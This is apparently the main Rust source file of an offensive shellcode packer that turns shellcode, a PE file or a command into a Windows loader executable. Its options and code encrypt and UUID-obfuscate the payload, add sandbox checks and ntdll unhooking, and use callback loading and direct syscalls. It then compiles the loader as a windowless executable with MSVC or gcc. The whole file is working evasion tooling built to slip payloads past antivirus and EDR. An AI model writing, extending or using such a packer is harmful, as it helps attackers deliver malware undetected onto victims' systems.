use clap::Parser;
use std::env;
use std::fs;
use std::path::PathBuf;
use std::process::Command;

mod encryption;
mod generator;
mod obfuscation;

const ASCII_ART: &str = r#"
   _____ _                       ____  _                 
  / ____| |                     |  _ \(_)                
 | |    | |__   ___  ___  ___   | |_) |_ ___  ___  ___   
 | |    | '_ \ / _ \/ __|/ _ \  |  _ <| / __|/ _ \/ __|  
 | |____| | | |  __/\__ \  __/  | |_) | \__ \  __/\__ \  
  \_____|_| |_|\___||___/\___|  |____/|_|___/\___||___/  

"#;

#[derive(Parser, Debug)]
#[command(author = "Blksword", version = "2.0", about = ASCII_ART, long_about = None)]
struct Args {
    #[arg(short, long)]
    input: Option<PathBuf>,
    #[arg(long, default_value = "aes")]
    enc: String,
    #[arg(long, default_value = "c")]
    lang: String,
    #[arg(short, long, default_value = "Program")]
    output: String,
    #[arg(short, long, default_value_t = 32)]
    key_length: u32,
    #[arg(long, default_value = "uuid")]
    obf: String,
    #[arg(short, long, default_value = "x64")]
    framework: String,
    #[arg(long, default_value_t = true)]
    sandbox: bool,
    #[arg(long, default_value_t = true)]
    unhook: bool,
    #[arg(long, default_value_t = true)]
    ntdll_unhook: bool,
    #[arg(long, default_value = "callback")]
    loading: String,
    #[arg(long, default_value_t = false)]
    debug: bool,
    #[arg(long)]
    cmd: Option<String>,
    #[arg(
        long,
        default_value_t = true,
        help = "Use Rust stub loader instead of C templates"
    )]
    use_stub: bool,
}

fn main() {
    let args = Args::parse();
    println!("{}", ASCII_ART);
    println!("Starting the advanced shellcode packing process...");
    println!("Configuration:");
    println!("{:#?}", args);

    if args.use_stub {
        let out_path = PathBuf::from(format!("{}.exe", args.output));
        if let Some(cmd) = args.cmd.as_ref() {
            match packer::pack_cmd(cmd, &out_path) {
                Ok(()) => {
                    println!("Packed using Rust stub: {}", out_path.display());
                }
                Err(e) => {
                    eprintln!("Failed to pack with Rust stub: {}", e);
                }
            }
            return;
        }
        if let Some(input_path) = args.input.as_ref() {
            let data = fs::read(input_path);
            if let Ok(d) = data {
                // Check for MZ header to identify PE file
                let is_pe = d.len() >= 2 && d[0] == b'M' && d[1] == b'Z';
                // Also consider .bin files as shellcode explicitly if they don't have MZ header
                // But if the user provided a .bin file that happens to start with MZ (unlikely for shellcode but possible),
                // we should treat it as shellcode if the extension is .bin
                let is_bin_ext = input_path
                    .extension()
                    .and_then(|e| e.to_str())
                    .map(|s| s.eq_ignore_ascii_case("bin"))
                    .unwrap_or(false);

                if is_pe && !is_bin_ext {
                    match packer::pack_file(input_path, &out_path) {
                        Ok(()) => {
                            println!("Packed file using Rust stub: {}", out_path.display());
                        }
                        Err(e) => {
                            eprintln!("Failed to pack with Rust stub: {}", e);
                        }
                    }
                } else {
                    // It's shellcode (either .bin file or no MZ header)
                    match packer::pack_shellcode(input_path, &out_path, "local", None) {
                        Ok(()) => {
                            println!("Packed shellcode using Rust stub: {}", out_path.display());
                        }
                        Err(e) => {
                            eprintln!("Failed to pack shellcode with Rust stub: {}", e);
                        }
                    }
                }
                return;
            } else {
                eprintln!("Failed to read input file");
                return;
            }
        }
        eprintln!("When --use-stub is set, provide either --cmd or --input");
        return;
    }

    let shellcode = if let Some(cmd) = args.cmd.as_ref() {
        let mut bytes = cmd.as_bytes().to_vec();
        bytes.push(0);
        println!(
            "\nUsing --cmd payload, {} bytes (NUL-terminated).",
            bytes.len()
        );
        bytes
    } else {
        let input_path = match args.input.as_ref() {
            Some(p) => p,
            None => {
                eprintln!("Missing required argument: --input when --cmd is not provided");
                return;
            }
        };
        match fs::read(input_path) {
            Ok(sc) => {
                println!("\nRead {} bytes of shellcode.", sc.len());
                sc
            }
            Err(e) => {
                eprintln!("Failed to read shellcode file: {}", e);
                return;
            }
        }
    };

    let (encrypted_shellcode_raw, key) =
        match encryption::encrypt(&shellcode, &args.enc, args.key_length) {
            Ok((enc_sc, key)) => (enc_sc, key),
            Err(e) => {
                eprintln!("Failed to encrypt shellcode: {}", e);
                return;
            }
        };
    println!("Shellcode encrypted using {} method.", args.enc);

    let encrypted_len = encrypted_shellcode_raw.len();
    let encrypted_shellcode = encrypted_shellcode_raw;

    let obfuscated_shellcode = match obfuscation::obfuscate(&encrypted_shellcode, &args.obf) {
        Ok(obf_sc) => obf_sc,
        Err(e) => {
            eprintln!("Failed to obfuscate shellcode: {}", e);
            return;
        }
    };
    println!("Shellcode obfuscated using {} method.", args.obf);

    let loader_source = match generator::generate(
        &args.lang,
        &obfuscated_shellcode,
        &key,
        &args.loading,
        &args.obf,
        args.unhook,
        &args.enc,
        args.cmd.as_deref(),
        encrypted_len,
        args.ntdll_unhook && args.cmd.is_none(),
    ) {
        Ok(source) => source,
        Err(e) => {
            eprintln!("Failed to generate loader source: {}", e);
            return;
        }
    };
    println!("Successfully generated loader source code.");
    if args.debug {
        println!("--- Generated Source ---");
        println!("{}", loader_source);
        println!("------------------------");
    }

    if let Err(e) = compile_loader(&loader_source, &args) {
        eprintln!("Failed to compile loader: {}", e);
    }
}

fn compile_loader(source: &str, args: &Args) -> Result<(), String> {
    let temp_dir = env::temp_dir();
    let c_file_path = temp_dir.join("loader.c");
    fs::write(&c_file_path, source).map_err(|e| e.to_string())?;

    let output_file = format!("{}.exe", args.output);
    // Try MSVC cl.exe first
    let mut msvc = Command::new("cl.exe");
    msvc.arg("/nologo")
        .arg("/O2")
        .arg("/link")
        .arg("/SUBSYSTEM:WINDOWS")
        .arg("/OUT:".to_owned() + &output_file);
    msvc.arg("Rpcrt4.lib");
    msvc.arg("Shell32.lib");
    msvc.arg(&c_file_path);
    if !args.unhook {
        let asm_file_path = "crates/packer/src/templates/syscall_stub.x64.asm";
        msvc.arg(asm_file_path);
    }
    println!("\nCompiling loader...");
    println!("Command: {:?}", msvc);
    let msvc_status = msvc.status();
    let compiled = match msvc_status {
        Ok(s) if s.success() => {
            println!("Loader compiled successfully: {}", output_file);
            true
        }
        _ => false,
    };

    if !compiled {
        println!("MSVC cl.exe not available or failed, falling back to gcc...");
        let mut gcc = Command::new("gcc");
        gcc.arg("-O2")
            .arg(&c_file_path)
            .arg("-o")
            .arg(&output_file)
            .arg("-lrpcrt4")
            .arg("-lbcrypt")
            .arg("-lshell32")
            .arg("-mwindows");
        println!("Command: {:?}", gcc);
        let gcc_status = gcc.status().map_err(|e| e.to_string())?;
        if !gcc_status.success() {
            return Err("Compilation failed".to_string());
        }
        println!("Loader compiled successfully (gcc): {}", output_file);
    }

    fs::remove_file(&c_file_path).ok();
    Ok(())
}
